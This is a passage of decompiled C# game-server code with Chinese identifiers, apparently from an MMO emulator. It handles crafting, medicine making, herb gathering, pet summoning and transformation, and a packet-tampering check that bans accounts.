								{
									int num4 = RNG.Next(1, 30);
									value2.移动(num3, num4, 15f, 101);
								}
							}
						}
					}
					else if (婚礼地图 == 9201 && !World.圣礼殿是否在使用中)
					{
						foreach (Players value3 in World.allConnectedChars.Values)
						{
							int num5 = RNG.Next(1, 30);
							if (value3.人物坐标_地图 == 婚礼地图)
							{
								int num6 = RNG.Next(1, 30);
								value3.移动(num5, num6, 15f, 101);
							}
						}
					}
					if (预备申请仪式计时器 != null)
					{
						预备申请仪式计时器.Enabled = false;
						预备申请仪式计时器.Close();
						预备申请仪式计时器.Dispose();
					}
				}
			}
			catch
			{
			}
		}

		public void 长白丹(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(封包数据, 18, array, 0, 2);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000009 || BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000010)
				{
					减去物品(BitConverter.ToInt32(array, 0), 1);
					int num = 0;
					for (int i = 0; i < 12; i++)
					{
						if (封包数据[18 + i * 4] != 0)
						{
							for (int j = 0; j < 12; j++)
							{
								if (气功[j].气功ID == 封包数据[18 + i * 4])
								{
									int num2 = 封包数据[20 + i * 4];
									num += 封包数据[20 + i * 4];
									if (气功[i].气功量 >= num2)
									{
										气功[i].气功量 -= num2;
										break;
									}
									系统提示("所分配点数与实际气功点数不一致,请重新分配。", 50, "系统提示");
									return;
								}
							}
						}
					}
					base.Player_Qigong_point += num;
					byte[] array2 = Converter.hexStringToByte("AA551F002C01021011000000050000000000000000000000000000000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send多包(array2, array2.Length);
					}
					更新气功();
					更新武功和状态();
					更新HP_MP_SP();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "长白丹  出错：" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 删除制作技术(byte[] 封包数据, int 封包大小)
		{
			if (base.FLD_制作类型 == 0)
			{
				删除制作技能提示(-9);
				return;
			}
			if (base.Player_Money < 30000000L)
			{
				删除制作技能提示(-8);
				return;
			}
			base.Player_Money -= 30000000L;
			base.FLD_制作类型 = 0;
			base.FLD_制作熟练度 = 0;
			byte[] array = Converter.hexStringToByte("AA550E001400431708000100000080C3C90155AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			计算人物制作等级();
			更新经验和历练();
			更新制作系统();
			更新金钱和负重();
		}

		public void 删除制作技能提示(int ID)
		{
			byte[] array = Converter.hexStringToByte("AA550E00140043170800F7FFFFFF0000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 制作系统动作(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			byte[] array2 = Converter.hexStringToByte("AA551200FA0341170400FA030200000000000000000055AA");
			System.Buffer.BlockCopy(array, 0, array2, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array2, array2.Length);
			}
			发送当前范围广播数据多包(array2, array2.Length);
		}

		public void 制作分解检查(byte[] data, int length)
		{
		}

		public void 制作分解系统(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			byte[] array = new byte[4];
			byte[] array2 = new byte[4];
			System.Buffer.BlockCopy(封包数据, 18, array, 0, 4);
			System.Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
			if (装备栏包裹[BitConverter.ToInt32(array2, 0)].物品绑定)
			{
				分解物品提示(-1);
				return;
			}
			if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品ID, 0) != BitConverter.ToInt32(array, 0))
			{
				分解物品提示(-1);
				return;
			}
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				分解物品提示(-1);
				return;
			}
			switch (base.FLD_制作类型)
			{
			case 1:
			{
				ItmeClass value3;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(array, 0), out value3) && value3.FLD_RESIDE2 == 4)
				{
					switch (value3.FLD_JOB_LEVEL)
					{
					case 2:
					{
						int value7 = RNG.Next(7, 9);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000721), num, BitConverter.GetBytes(value7), new byte[56]);
						break;
					}
					case 3:
					{
						int value6 = RNG.Next(19, 21);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000722), num, BitConverter.GetBytes(value6), new byte[56]);
						break;
					}
					case 4:
					{
						int value5 = RNG.Next(7, 11);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000723), num, BitConverter.GetBytes(value5), new byte[56]);
						break;
					}
					case 5:
					{
						int value4 = RNG.Next(7, 11);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000724), num, BitConverter.GetBytes(value4), new byte[56]);
						break;
					}
					}
				}
				break;
			}
			case 2:
			{
				int value = RNG.Next(7, 9);
				ItmeClass value2;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(array, 0), out value2))
				{
					if (value2.FLD_LEVEL >= 100)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000736), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 80 && value2.FLD_LEVEL < 99)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000735), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 60 && value2.FLD_LEVEL < 79)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000734), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 40 && value2.FLD_LEVEL < 59)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000733), num, BitConverter.GetBytes(value), new byte[56]);
					}
				}
				break;
			}
			case 3:
				switch (BitConverter.ToInt32(array, 0))
				{
				case 800000002:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000746), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000001:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000745), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000028:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000749), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000024:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000748), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000023:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000747), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				}
				break;
			}
			byte[] array3 = Converter.hexStringToByte("AA55120054003117040001000000000000000000477B55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array3, array3.Length);
			}
		}

		public void 制作系统检查(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			int key = BitConverter.ToInt32(封包数据, 10);
			制作物品类 value;
			if (得到包裹空位(this) == -1)
			{
				分解物品提示(-1);
			}
			else if (World.制作物品列表.TryGetValue(key, out value))
			{
				if (base.FLD_制作类型 == value.制作类型 && base.FLD_制作等级 >= value.制作等级)
				{
					if (value.需要物品.Count <= 0)
					{
						分解物品提示(-3);
						Form1.WriteLine(1, "制作物品列表                                错误" + value.物品名);
					}
					else
					{
						foreach (制作需要物品类 item in value.需要物品)
						{
							物品类 物品类 = 得到包裹物品(item.Id);
							if (物品类 == null || BitConverter.ToInt32(物品类.物品数量, 0) < item.number)
							{
								分解物品提示(-3);
								break;
							}
						}
					}
				}
				else
				{
					分解物品提示(-1);
				}
			}
			else
			{
				分解物品提示(-1);
			}
		}

		public void 制作物品New(制作物品类 物品, int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			byte[] array = new byte[56];
			int num = new Random(DateTime.Now.Millisecond).Next(0, 1501 - base.FLD_制作熟练度);
			int value = 0;
			if (num < 10)
			{
				value = 2;
			}
			else if (num < 45)
			{
				value = 1;
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 52, 2);
			增加物品2(bytes, BitConverter.GetBytes(物品.物品ID), 空位, BitConverter.GetBytes(1), array);
			Form1.WriteLine(5, "制作物品  [" + base.Userid + "]  [" + base.UserName + "]  物品名[" + 物品.物品名 + "]  全局ID=[" + BitConverter.ToInt32(bytes, 0) + "]        LV[" + value + "]");
		}

		public void 制作系统制作(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int key = BitConverter.ToInt32(封包数据, 10);
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				分解物品提示(-1);
				return;
			}
			制作物品类 value;
			if (World.制作物品列表.TryGetValue(key, out value))
			{
				if (base.FLD_制作类型 == value.制作类型 && base.FLD_制作等级 >= value.制作等级)
				{
					if (value.需要物品.Count <= 0)
					{
						分解物品提示(-3);
						Form1.WriteLine(1, "制作物品列表                                错误" + value.物品名);
						return;
					}
					foreach (制作需要物品类 item in value.需要物品)
					{
						物品类 物品类 = 得到包裹物品(item.Id);
						if (物品类 == null || BitConverter.ToInt32(物品类.物品数量, 0) < item.number)
						{
							分解物品提示(-3);
							return;
						}
					}
					foreach (制作需要物品类 item2 in value.需要物品)
					{
						物品类 物品类2 = 得到包裹物品(item2.Id);
						if (物品类2 != null)
						{
							减去物品(物品类2.物品位置, item2.number);
							break;
						}
					}
					switch (base.FLD_制作类型)
					{
					case 1:
					{
						ItmeClass value2;
						if (!World.Itme.TryGetValue(value.物品ID, out value2))
						{
							break;
						}
						if (value2.FLD_RESIDE2 != 0)
						{
							制作物品New(value, num);
							if (base.FLD_制作等级 <= value.制作等级)
							{
								int num2 = ++base.FLD_制作熟练度;
								更新经验和历练();
								计算人物制作等级();
							}
						}
						else
						{
							增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), num, BitConverter.GetBytes(value.物品数量), new byte[56]);
						}
						break;
					}
					case 2:
					{
						ItmeClass value3;
						if (!World.Itme.TryGetValue(value.物品ID, out value3))
						{
							break;
						}
						if (value3.FLD_RESIDE2 != 0)
						{
							制作物品New(value, num);
							if (base.FLD_制作等级 <= value.制作等级)
							{
								int num2 = ++base.FLD_制作熟练度;
								更新经验和历练();
								计算人物制作等级();
							}
						}
						else
						{
							增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), num, BitConverter.GetBytes(value.物品数量), new byte[56]);
						}
						break;
					}
					case 3:
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), num, BitConverter.GetBytes(value.物品数量), new byte[56]);
						if (base.FLD_制作等级 <= value.制作等级)
						{
							int num2 = ++base.FLD_制作熟练度;
							更新经验和历练();
							计算人物制作等级();
						}
						break;
					}
				}
				else
				{
					分解物品提示(-2);
				}
			}
			else
			{
				分解物品提示(-2);
			}
			byte[] array = Converter.hexStringToByte("AA55120084023617040001000000000000000000D80855AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 学习制作技能(byte[] 封包数据, int 封包大小)
		{
			if (base.FLD_制作类型 == 0)
			{
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
				base.FLD_制作类型 = BitConverter.ToInt32(array, 0);
				base.FLD_制作熟练度 = 0;
				byte[] array2 = Converter.hexStringToByte("AA556600BF013917580002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000784A55AA");
				System.Buffer.BlockCopy(array, 0, array2, 11, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array2, array2.Length);
				}
				计算人物制作等级();
				更新经验和历练();
				更新制作系统();
			}
		}

		public void 潜行(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			int value = BitConverter.ToInt32(array, 0);
			int value2 = BitConverter.ToInt16(封包数据, 18);
			byte[] array2 = Converter.hexStringToByte("AA552600E2015117180001000000B2390C002C01000001000000000000009F000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array2, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array2, 18, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
			发送当前范围广播数据(array2, array2.Length);
		}

		public void 制药系统(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int key = BitConverter.ToInt32(封包数据, 14);
			int num = 得到包裹空位(this);
			int num2 = BitConverter.ToInt32(封包数据, 22);
			Random random = new Random();
			制药物品类 value;
			if (!World.制药物品列表.TryGetValue(key, out value))
			{
				return;
			}
			foreach (制药需要物品类 item in value.需要物品)
			{
				for (int i = 0; i < 装备栏包裹.Length; i++)
				{
					if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == item.Id && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= item.number)
					{
						减去物品(i, item.number * num2);
						break;
					}
				}
			}
			for (int j = 0; j < num2; j++)
			{
				if ((double)random.Next(0, 110) <= 80.0 + base.医_神农仙术)
				{
					增加物品4(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), num, BitConverter.GetBytes(j), new byte[56]);
					byte[] array = Converter.hexStringToByte("AA55160088041B1710000B00010045CD9A3B000000000100000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(value.物品ID), 0, array, 14, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(j), 0, array, 22, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else
				{
					系统提示("制药失败，医生可以提高制药成功率！", 50, "制药提示");
				}
			}
		}

		public void 采药(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			NpcClass value;
			if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(BitConverter.ToInt32(array, 0), out value))
			{
				value.NPC死亡 = false;
				value.发送采药数据();
				value.发送死亡数据(base.人物全服ID);
				int fLD_PID = value.FLD_PID;
				int num = 得到包裹空位(this);
				byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
				switch (fLD_PID)
				{
				case 15272:
				case 15273:
				case 15274:
				case 15275:
				case 15276:
				case 15277:
					break;
				case 15269:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000795), 装备栏包裹[num].物品属性);
					break;
				case 15270:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000796), 装备栏包裹[num].物品属性);
					break;
				case 15271:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000797), 装备栏包裹[num].物品属性);
					break;
				case 15278:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000798), 装备栏包裹[num].物品属性);
					break;
				case 15279:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000799), 装备栏包裹[num].物品属性);
					break;
				case 15280:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000800), 装备栏包裹[num].物品属性);
					break;
				case 15281:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000801), 装备栏包裹[num].物品属性);
					break;
				case 15282:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000802), 装备栏包裹[num].物品属性);
					break;
				case 15283:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000803), 装备栏包裹[num].物品属性);
					break;
				case 15284:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000804), 装备栏包裹[num].物品属性);
					break;
				case 15285:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000807), 装备栏包裹[num].物品属性);
					break;
				case 15286:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000808), 装备栏包裹[num].物品属性);
					break;
				case 15287:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000809), 装备栏包裹[num].物品属性);
					break;
				case 15288:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000810), 装备栏包裹[num].物品属性);
					break;
				case 15289:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000811), 装备栏包裹[num].物品属性);
					break;
				case 15290:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000812), 装备栏包裹[num].物品属性);
					break;
				case 15291:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000813), 装备栏包裹[num].物品属性);
					break;
				case 15292:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000814), 装备栏包裹[num].物品属性);
					break;
				}
			}
		}

		public void 采到物品(int 位置, byte[] 数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性)
		{
			try
			{
				ItmeClass value;
				if (World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					byte[] array = Converter.hexStringToByte("AA55720094020D006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
					byte[] array2 = new byte[World.数据库单个物品大小];
					if (value.FLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (BitConverter.ToInt32(物品ID, 0) != 1008000044 && BitConverter.ToInt32(物品ID, 0) != 1008000045)
						{
							if (物品类 != null)
							{
								位置 = 物品类.物品位置;
								物品全局ID = 物品类.物品全局ID;
								数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类.物品数量, 0) + BitConverter.ToInt32(数量, 0));
							}
						}
						else
						{
							物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
						}
					}
					else
					{
						数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 39, 2);
					System.Buffer.BlockCopy(array2, 0, array, 14, 12);
					System.Buffer.BlockCopy(array2, 12, array, 30, 4);
					System.Buffer.BlockCopy(array2, 16, array, 43, 物品属性.Length);
					装备栏包裹[位置].物品_byte = array2;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错2  [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 名字样式(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] array3 = new byte[4];
				byte[] dst = new byte[4];
				byte[] array4 = new byte[4];
				byte[] array5 = new byte[4];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 4);
				System.Buffer.BlockCopy(封包数据, 14, array3, 0, 4);
				System.Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
				System.Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
				System.Buffer.BlockCopy(封包数据, 30, array4, 0, 4);
				System.Buffer.BlockCopy(封包数据, 34, array5, 0, 4);
				if (BitConverter.ToInt32(array, 0) == 0)
				{
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000189)
					{
						goto IL_00fc;
					}
				}
				else if (BitConverter.ToInt32(array, 0) == 1)
				{
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000191)
					{
						goto IL_00fc;
					}
				}
				else if (BitConverter.ToInt32(array, 0) != 2 || BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0) == 1008000192)
				{
					goto IL_00fc;
				}
				goto end_IL_0000;
				IL_00fc:
				System.Buffer.BlockCopy(array, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0), 4);
				System.Buffer.BlockCopy(array2, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 4, 4);
				System.Buffer.BlockCopy(array4, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 8, 4);
				System.Buffer.BlockCopy(array5, 0, base.人物名字模版, 16 * BitConverter.ToInt32(array, 0) + 12, 4);
				byte[] array6 = Converter.hexStringToByte("AA5520006000721710000000000003000000CCCCFFFFFF5000FF0000000000000000000055AA");
				System.Buffer.BlockCopy(array, 0, array6, 10, 4);
				System.Buffer.BlockCopy(array2, 0, array6, 14, 4);
				System.Buffer.BlockCopy(array4, 0, array6, 18, 4);
				System.Buffer.BlockCopy(array5, 0, array6, 22, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array6, array6.Length);
				}
				发送当前范围广播数据多包(array6, array6.Length);
				减去物品(BitConverter.ToInt32(array3, 0), 1);
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "名字样式!出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 封包修改(byte[] data, int length)
		{
			try
			{
				if (base.人物全服ID == 0)
				{
					base.Client.Dispose();
				}
				else
				{
					byte[] array = new byte[4];
					System.Buffer.BlockCopy(data, 4, array, 0, 2);
					int num = BitConverter.ToInt32(array, 0);
					if (num != base.人物全服ID && num != base.人物灵兽全服ID && World.封包封号 == 1)
					{
						封号(72, base.Userid, "非法修改封包封号");
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "封包修改!出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 清空灵兽状态列表()
		{
			if (追加状态列表 != null)
			{
				if (GetAddState(1000000167))
				{
					追加状态列表[1000000167].时间结束事件();
				}
				if (GetAddState(1000000168))
				{
					追加状态列表[1000000168].时间结束事件();
				}
				if (GetAddState(1000000170))
				{
					追加状态列表[1000000170].时间结束事件();
				}
				if (GetAddState(1000000171))
				{
					追加状态列表[1000000171].时间结束事件();
				}
				if (GetAddState(1000000173))
				{
					追加状态列表[1000000173].时间结束事件();
				}
				if (GetAddState(1000000174))
				{
					追加状态列表[1000000174].时间结束事件();
				}
				if (GetAddState(1000000176))
				{
					追加状态列表[1000000176].时间结束事件();
				}
				if (GetAddState(1000000177))
				{
					追加状态列表[1000000177].时间结束事件();
				}
				if (GetAddState(700201))
				{
					追加状态列表[700201].时间结束事件();
				}
				if (GetAddState(700202))
				{
					追加状态列表[700202].时间结束事件();
				}
				if (GetAddState(700203))
				{
					追加状态列表[700203].时间结束事件();
				}
				if (GetAddState(700301))
				{
					追加状态列表[700301].时间结束事件();
				}
				if (GetAddState(700302))
				{
					追加状态列表[700302].时间结束事件();
				}
				if (GetAddState(700303))
				{
					追加状态列表[700303].时间结束事件();
				}
			}
		}

		public void 清空灵兽状态()
		{
			if (人物灵兽 != null)
			{
				人物灵兽.保存数据();
				base.FLD_宠物_追加_经验百分比 = 0.0;
				base.FLD_宠物_追加_攻击 = 0;
				base.FLD_宠物_追加_防御 = 0;
				base.FLD_宠物_追加_最大HP = 0;
				if (!退出中 && base.Client.Running)
				{
					更新HP_MP_SP();
					更新武功和状态();
				}
				清空灵兽状态列表();
				if (人物灵兽.攻击列表 != null)
				{
					人物灵兽.攻击列表.Clear();
					人物灵兽.攻击列表 = null;
				}
				召唤提示(1, 1);
				解除召唤(this, this);
				人物灵兽.Dispose();
				人物灵兽 = null;
				装备栏已穿装备[14].锁定 = false;
			}
		}

		public void 死亡宠物()
		{
			人物灵兽.死亡 = true;
			宠物动作(5);
		}

		public void 灵兽变身(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (装备栏已穿装备[14].Get物品ID != 1000001011L && 装备栏已穿装备[14].Get物品ID != 1000001377L && 装备栏已穿装备[14].Get物品ID != 1000001378L && 装备栏已穿装备[14].Get物品ID != 1000001379L)
				{
					封包修改(封包数据, 封包大小);
					byte[] array = new byte[4];
					System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
					byte[] array2 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 12, array2, 0, 2);
					byte[] array3 = Converter.hexStringToByte("AA552200F4045B1014000100050038FE0D108546940181DC143C00000100000000000000E4A255AA");
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) == 1008000129)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						byte[] array4 = Converter.hexStringToByte("AA5514002C015C100600989E00000100000000000000000055AA");
						System.Buffer.BlockCopy(array2, 0, array4, 14, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物灵兽全服ID), 0, array4, 10, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
						发送当前范围广播数据(array4, array4.Length);
						if (人物灵兽 != null)
						{
							人物灵兽.Bs = BitConverter.ToInt16(array2, 0);
						}
						减去物品(BitConverter.ToInt32(array, 0), 1);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "灵兽变身![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 宠物动作包(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[2];
			System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
			宠物动作(BitConverter.ToInt16(array, 0));
		}

		public void 召唤宠物(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			if (base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201)
			{
				return;
			}
			int num = BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0);
			int num2 = BitConverter.ToInt16(封包数据, 10);
			if (num == 0 || !World.Itme.ContainsKey(num))
			{
				return;
			}
			long long_ = BitConverter.ToInt64(装备栏已穿装备[14].物品全局ID, 0);
			ItmeClass itmeClass = World.Itme[num];
			if (itmeClass.FLD_RESIDE2 != 15)
			{
				return;
			}
			if (人物灵兽 == null)
			{
				读出灵兽数据(long_, this);
				if (人物灵兽 != null && 人物灵兽.ZrName == base.UserName)
				{
					人物灵兽.Playe = this;
					if (人物灵兽.FLD_HP <= 0)
					{
						召唤提示(0, 4);
						清空灵兽状态();
						return;
					}
					if (人物灵兽.FLD_ZCD < 100)
